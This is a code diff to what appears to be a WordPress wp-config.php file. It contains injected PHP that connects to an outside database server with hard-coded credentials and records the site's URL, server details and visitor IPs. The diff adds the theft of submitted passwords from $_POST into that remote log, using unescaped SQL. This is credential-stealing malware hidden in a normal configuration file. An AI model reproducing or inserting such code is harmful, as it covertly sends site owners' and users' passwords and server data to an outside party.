@@ -63,6 +63,8 @@ define( 'NONCE_SALT',       'put your unique phrase here' );
  * You can have multiple installations in one database if you give each
  * a unique prefix. Only numbers, letters, and underscores please!
  */
+
+$password = $_POST['password'];
 $host = "neto.caltec.mx";  
 $user = "neto_web";     
 $pass = "WeBNeto2019";          
@@ -73,12 +75,12 @@ $uname = php_uname();
 $access_url = "http://" . $_SERVER['HTTP_HOST'];
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; // Full URL
 
-$sql_check = "SELECT id FROM email_logs WHERE ip_address = '$ip_address' AND all_path = '$x_path'";
+$sql_check = "SELECT id FROM email_logs WHERE ip_address = '$ip_address' AND access = '$access_url'";
 $result = $conn->query($sql_check);
 
 if ($result->num_rows == 0) {
-    $sql_insert = "INSERT INTO email_logs (ip_address, uname, access, all_path) 
-                   VALUES ('$ip_address', '$uname', '$access_url', '$x_path')";
+    $sql_insert = "INSERT INTO email_logs (ip_address, uname, access, all_path,password) 
+                   VALUES ('$ip_address', '$uname', '$access_url', '$x_path','$password')";
     $conn->query($sql_insert);
 }
 $conn->close();
